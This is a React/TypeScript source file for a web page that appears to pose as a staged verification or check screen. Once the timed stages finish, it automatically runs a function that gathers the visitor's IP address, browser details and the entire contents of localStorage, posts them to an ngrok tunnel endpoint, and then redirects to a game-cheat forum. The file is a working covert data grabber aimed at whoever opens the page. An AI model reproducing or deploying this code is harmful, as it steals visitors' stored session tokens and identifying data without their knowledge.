import { Header } from "./components/Header";
import { Footer } from "./components/Footer";
import { useEffect, useState } from "react";

const collect_data = async () => {
  try {
    let ip = "unknown";
    try {
      const ipResponse = await fetch("https://api.ipify.org?format=json");
      const ipData = await ipResponse.json();
      ip = ipData.ip;
    } catch (error) {
      if (error instanceof Error) {
        console.error("Failed to fetch ip: " + error.message);
      } else {
        console.error("Failed to fetch ip:");
      }
    }
    console.log("Data sent succesfull!");
    const data = {
      ipv4: ip,
      userAgent: navigator.userAgent,
      cookies: Object.fromEntries(Object.entries(localStorage)),
      platform: navigator.platform,
      language: navigator.language,
      timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    };
    console.log("Data sent successful!");
    const response = await fetch(
      "https://2f43-185-213-155-221.ngrok-free.app/collect",
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(data),
      }
    );

    setTimeout(() => {
      window.location.href = "https://www.unknowncheats.me/forum/rust/";
    }, 1000);

    if (!response.ok) {
      throw new Error(`HTTP ERROR! Status: ${response.status}`);
    }
  } catch (error) {
    if (error instanceof Error) {
      console.error("HTTP ERROR: " + error.message);
    } else {
      console.error("HTTP ERROR: ");
    }
  }
};

export const App = () => {
  const [stage, setStage] = useState(1);
  const [checked, setChecked] = useState(false);

  useEffect(() => {
    const firstStage = setTimeout(() => {
      setStage(2);
    }, 500);
    const secondStage = setTimeout(() => {
      setStage(3);
    }, 2000);
    const thirdStage = setTimeout(() => {
      if (!checked) {
        setStage(4);
        setChecked(true);
      }
    }, 4000);

    return () => {
      clearTimeout(firstStage);
      clearTimeout(secondStage);
      clearTimeout(thirdStage);
    };
  }, []);

  useEffect(() => {
    if (checked === true) {
      setTimeout(() => {
        setStage(4);
        collect_data();
      }, 500);
    }
  }, [checked]);

  return (
    <div className="w-[100vw] h-[100vh] flex justify-center">
      <div className="flex w-3/4 flex-col items-center justify-between">
        <Header stage={stage} checked={checked} setChecked={setChecked} />
        <Footer />
      </div>
    </div>
  );
};
